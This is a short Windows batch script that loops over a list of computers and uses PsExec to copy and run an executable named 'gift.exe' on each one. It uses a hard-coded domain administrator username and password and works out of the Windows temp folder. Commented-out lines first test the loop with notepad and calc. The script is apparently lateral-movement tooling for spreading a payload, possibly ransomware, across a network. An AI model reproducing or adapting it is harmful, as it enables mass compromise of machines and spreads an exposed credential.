cd c:\windows\temp\
REM for /F %%x in (c:\windows\temp\computers.txt) do c:\windows\temp\psexec.exe %%x  -accepteula -d -u vonese\administrator  -p Zxcv7890! notepad 
REM for /f %%x in (c.txt) do  psexec33.exe %%x -accepteula -d -u vonese\administrator -p Zxcv7890! -h calc.exe 
for /F %%x in (computers.txt) do psexec.exe %%x -accepteula -d -u vonese\administrator -p Zxcv7890! -h -c "c:\windows\temp\gift.exe"
